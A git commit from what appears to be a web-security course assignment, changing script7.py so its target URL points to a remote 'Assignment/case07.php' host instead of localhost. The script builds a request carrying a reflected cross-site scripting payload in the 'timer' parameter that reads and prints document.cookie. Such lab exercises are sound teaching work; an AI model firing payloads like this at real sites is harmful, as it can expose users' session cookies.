f433f2c4d3d70ba371937d870f573ed684c6c94c
Lgmrszd <m.v.bobrov@yandex.ru>
2020-02-23 22:34:19 +0300

    url fix

--- script7.py
+++ script7.py
@@ -1,8 +1,8 @@
 from urllib import request, parse
 import webbrowser
 
-base_url = "http://localhost:20080/Assignment/case07.php"
-# base_url = "http://iu.ru/Assignment/case07.php"
+# base_url = "http://localhost:20080/Assignment/case07.php"
+base_url = "http://iu.ru/Assignment/case07.php"
 
 url = base_url + "?timer=<script>alert(document.cookie);document.write(document.cookie);</script>"
 
